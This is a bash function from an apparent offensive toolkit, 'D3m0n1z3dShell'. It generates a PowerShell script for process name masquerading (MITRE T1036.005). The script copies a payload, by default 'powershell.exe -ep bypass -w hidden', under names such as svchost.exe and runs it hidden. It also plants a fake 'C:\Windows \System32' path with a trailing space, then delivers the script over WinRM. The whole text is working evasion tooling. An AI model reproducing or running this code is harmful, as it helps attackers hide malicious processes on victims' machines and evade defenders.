# 3. T1036.005 — Process Name Masquerading
# ──────────────────────────────────────────────
gen_masquerade() {
    echo -e "${CYAN}[*] T1036.005 — Process Name/Path Masquerading${NC}"

    echo -e "  Masquerade as:"
    echo -e "  ${CYAN}[1]${NC} svchost.exe"
    echo -e "  ${CYAN}[2]${NC} explorer.exe"
    echo -e "  ${CYAN}[3]${NC} RuntimeBroker.exe"
    echo -e "  ${CYAN}[4]${NC} Custom name"
    read -p "  Target [1]: " MN; MN="${MN:-1}"

    case "$MN" in
        1) MNAME="svchost.exe" ;;
        2) MNAME="explorer.exe" ;;
        3) MNAME="RuntimeBroker.exe" ;;
        4) read -p "  Process name: " MNAME ;;
    esac

    read -p "  Payload to execute [powershell.exe -ep bypass -w hidden]: " MPAY
    MPAY="${MPAY:-powershell.exe -ep bypass -w hidden}"

    local OUTFILE="${PAYLOAD_DIR}/win_masquerade.ps1"
    cat > "$OUTFILE" << PSEOF
# T1036.005 — Process Name Masquerading
# Generated by D3m0n1z3dShell
# Copies payload as a legitimate-looking process name in a trusted path

\$masqueradeName = "${MNAME}"
\$payload = "${MPAY}"

Write-Host "[*] Process Masquerading as: \$masqueradeName" -ForegroundColor Yellow

# Method 1: Copy to temp with legitimate name
\$tempPath = "\$env:TEMP\\\$masqueradeName"
\$sourceExe = (\$payload -split ' ')[0]
\$realPath = (Get-Command \$sourceExe -ErrorAction SilentlyContinue).Source

if (\$realPath -and (Test-Path \$realPath)) {
    Copy-Item \$realPath \$tempPath -Force
    Write-Host "[+] Copied \$realPath -> \$tempPath" -ForegroundColor Green

    # Get arguments (everything after the exe name)
    \$args = (\$payload -replace [regex]::Escape(\$sourceExe), '').Trim()
    Start-Process \$tempPath -ArgumentList \$args -WindowStyle Hidden
    Write-Host "[+] Started masqueraded process: \$masqueradeName" -ForegroundColor Green
} else {
    Write-Host "[-] Source exe not found: \$sourceExe" -ForegroundColor Red
}

# Method 2: Use a trusted path mimic (directory with trailing space or unicode)
\$fakePath = "C:\\Windows \\System32"
try {
    New-Item -ItemType Directory -Path \$fakePath -Force -ErrorAction SilentlyContinue | Out-Null
    if (\$realPath) {
        Copy-Item \$realPath "\$fakePath\\\$masqueradeName" -Force
        Write-Host "[+] Placed in fake trusted path: \$fakePath\\\$masqueradeName" -ForegroundColor Green
        Write-Host "[*] This path looks like C:\\Windows\\System32 but has a trailing space" -ForegroundColor Yellow
    }
} catch {
    Write-Host "[-] Fake path creation failed: \$_" -ForegroundColor Red
}
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

